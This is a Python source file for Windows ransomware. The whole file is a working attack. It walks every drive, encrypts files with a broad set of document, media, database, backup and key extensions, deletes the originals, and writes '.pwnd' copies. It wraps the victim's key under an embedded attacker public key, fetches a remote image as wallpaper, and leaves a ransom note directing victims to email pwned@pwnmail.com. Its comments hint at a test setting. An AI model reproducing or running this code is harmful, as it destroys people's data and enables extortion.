from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from cryptography.fernet import Fernet
import ctypes
import urllib.request
import os
import sys
import time

#this one is using the new 4096 key in Desktop/ransomware_test
class Encryptor:

    def __init__(self):
        
        #attacker's public key for encrypting victim's private key
        self.serv_pubkey = RSA.import_key("embed key here")

        #only encrypt files with these extensions
        self.exts = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
        
        #exclude these files specifically
        self.exc_files = ["fernkey.fern","private.pem"]
        
        #exclude these directories, and any other subdirectories in them
        self.exc_dirs = ["system32", "python37", "python38","appdata"]
        
        self.fernkey = None
        self.crypt = None
        self.privkey = None
        self.pubkey = None

        #used to get desktop path etc
        self.sysRoot = os.path.expanduser('~')

        #used for file names so they can be easily identified if multiple victims are compromised
        self.name = os.environ["COMPUTERNAME"]

        #get all in-use drive letters, including portable and cd-rom
        dr = [chr(i) for i in range(ord('A'), ord('Z')+1)]
        self.drives = [(d + ":\\") for d in dr if os.path.exists(f'{d}:')]

    def generate_fernkey(self):

        #Generate RSA key for this victim
        rsa = RSA.generate(2048)

        #Encryptor using the embedded attacker's public key
        rsacrypt = PKCS1_OAEP.new(self.serv_pubkey)

        #Create a fernkey encryptor
        self.fernkey = Fernet.generate_key()
        self.crypt = Fernet(self.fernkey)

        #Victim's public key, this will be used to encrypt the files on the system
        self.pubkey = rsa.publickey()

        #Encrypt victim's private key using the Fernet encryptor just created and store it for future decryption
        self.priv_key_path = self.sysRoot + "\\AppData\\Local\\Temp\\priv_vic_key.btkt"
        with open(self.priv_key_path, "wb") as f:
            priv_vic = self.crypt.encrypt(rsa.exportKey())
            f.write(priv_vic)

        #Encrypt the Fernet key that was used to encrypt the victim's private key using attacker's public key and store it
        #the victim will have to send this file to the attacker to decrpyt their system
        sendfile = self.name + "-send_me.btkt"
        path = self.sysRoot + "\\Desktop\\" + sendfile
        with open(path, "wb") as f:
            enc_fern = rsacrypt.encrypt(self.fernkey)
            f.write(enc_fern)
        
        rsa = None
        rsacrypt = None
        
        #Create a brand new Fernet encryptor
        self.fernkey = Fernet.generate_key()
        self.crypt = Fernet(self.fernkey)


    def encrypt_fernkey(self):

        #Encrypt the Fernet key that was used to encrypt the victim's using the victim's public key
        #and store it in the file fernkey.fern
        self.crypt = None
        self.crypt = PKCS1_OAEP.new(self.pubkey)
        self.fernkey_path = self.sysRoot + "\\AppData\\Local\\Temp\\fernkey.fern"
        with open(self.fernkey_path, 'wb') as f:
            f.write(self.crypt.encrypt(self.fernkey))
        self.crypt = None

    def traverse(self):

        self.generate_fernkey()

        #Traverse every disk that was found in __init__
        for start in self.drives:
            system = os.walk(start, topdown=True)
            for root, _, files in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    #Check if this directory is excluded OR if this file is excluded OR if this extension is not meant to be encrypted
                    if not set(self.exc_dirs).isdisjoint(set(root.lower().split("\\"))) or file in self.exc_files or ("." + file.split(".")[-1]) not in self.exts:
                        continue
                    else:
                        self.encrypt_file(file_path)
                    
        self.encrypt_fernkey()
        
    def encrypt_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                #Read all data from file into memory
                data = f.read()
                #Encrypt the read data
                enc_data = self.crypt.encrypt(data)
                data = None
            
            #Remove the original file and replace with one that is encrypted and appended with a .pwnd tag
            os.remove(file_path)
            file_path = file_path + ".pwnd"
            with open(file_path, "wb") as f:
                f.write(enc_data)
                enc_data = None
        except:
            pass

    def change_desktop_background(self):
            imageUrl = 'https://motherboard-images.vice.com/content-images/article/no-id/1464718313126415.png'
            
            # Go to specif url and download+save image using absolute path
            try:
                path = f'{self.sysRoot}\\Desktop\\background.jpg'
                urllib.request.urlretrieve(imageUrl, path)
                SPI_SETDESKWALLPAPER = 20
                
                # Access windows dlls for funcionality eg, changing dekstop wallpaper
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
            except:
                pass
    
    def ransom_note(self):

        #Leave a note on Desktop to tell victim what to do
        path = self.sysRoot + "\\Desktop\\READ_ME_URGENT.txt"
        with open(path, 'w') as f:
            f.write(f'''
Unfortunately, your files have been encrypted, that means they are unreadable, by a Military Grade Encryption Algorihm. But
Do Not Fear! Your files and photos can still be decrypted, by us. You must not shutdown your computer before decrypting your
files or they will be lost.
To purchase your key and restore your data, please follow these three easy steps:
1. Make a donation of $1000 to any reputable puppy shelter near you and keep the receipt.
2. Email your receipt and the file called {self.name}-send_me.btkt on your desktop to pwned@pwnmail.com
3. You will receive a file that will then let you decrypt all your files, as if nothing happened!
IMPORTANT: Place the {self.name}-use_me.btkt file you receive on your desktop or the decryption will not start.
WARNING:
Do NOT close your computer as this may cause your files to become irreversibly lost.
Do NOT move any files in your computer, this may prevent the decryptor from working and 
you WILL lose all your data.
Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock 
your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files
-and there is a high chance you will lose your files forever.
''')
    
def main(ots):
    e = Encryptor()
    e.traverse()
    e.ransom_note()
    e.change_desktop_background()

if __name__ == "__main__":
    main(sys.argv[1:])
